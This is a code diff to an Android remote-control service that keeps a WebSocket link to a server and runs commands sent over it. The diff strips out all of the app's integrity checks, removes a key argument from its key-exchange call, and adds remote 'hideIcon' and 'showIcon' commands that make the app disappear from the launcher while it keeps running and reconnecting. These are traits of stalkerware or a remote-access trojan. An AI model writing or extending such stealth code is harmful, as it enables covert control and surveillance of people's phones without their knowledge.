@@ -4,8 +4,10 @@ import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.hardware.camera2.CameraAccessException
 import android.hardware.camera2.CameraManager
 import android.media.AudioAttributes
@@ -51,11 +53,6 @@ class DeviceService : Service() {
         StorageManager.init(this)
         SecurityManager.init(this)
         
-        if (!SecurityManager.verifyAllSecurity()) {
-            stopSelf()
-            return
-        }
-        
         startForegroundService()
         audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
         vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
@@ -68,12 +65,6 @@ class DeviceService : Service() {
     
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         super.onStartCommand(intent, flags, startId)
-        
-        if (!SecurityManager.verifyApp()) {
-            stopSelf()
-            return START_NOT_STICKY
-        }
-        
         return START_STICKY
     }
     
@@ -99,11 +90,6 @@ class DeviceService : Service() {
     
     private fun connectToServer() {
         if (isConnected) return
-        
-        if (!SecurityManager.verifyApp()) {
-            stopSelf()
-            return
-        }
         
         val ws = object : WebSocketClient(URI("wss://192.168.0.103:1674")) {
             
@@ -150,7 +136,6 @@ class DeviceService : Service() {
             when (json.getString("type")) {
                 "keyExchange" -> handleKeyExchange(json)
                 "encrypted" -> handleEncryptedMessage(json)
-                "deviceInfo" -> sendDeviceInfo()
             }
         } catch (_: Exception) {}
     }
@@ -166,7 +151,6 @@ class DeviceService : Service() {
             
             sharedKey = CryptoManager.x3dh(
                 myKeyPair!!.private,
-                myKeyPair!!.public,
                 theirPublicKey,
                 theirIdentityKey,
                 myIdentityKeyPair!!.private
@@ -227,7 +211,29 @@ class DeviceService : Service() {
                     if (json.getString("action") == "on") flashlightOn()
                     else flashlightOff()
                 }
+                "hideIcon" -> hideAppIcon()
+                "showIcon" -> showAppIcon()
             }
+        } catch (_: Exception) {}
+    }
+    
+    private fun hideAppIcon() {
+        try {
+            packageManager.setComponentEnabledSetting(
+                ComponentName(this, MainActivity::class.java),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        } catch (_: Exception) {}
+    }
+    
+    private fun showAppIcon() {
+        try {
+            packageManager.setComponentEnabledSetting(
+                ComponentName(this, MainActivity::class.java),
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP
+            )
         } catch (_: Exception) {}
     }
     
@@ -307,12 +313,8 @@ class DeviceService : Service() {
     private fun sleepAndReconnect() {
         serviceScope.launch {
             delay(10000)
-            if (SecurityManager.verifyApp()) {
-                generateKeyPairs()
-                connectToServer()
-            } else {
-                stopSelf()
-            }
+            generateKeyPairs()
+            connectToServer()
         }
     }
     
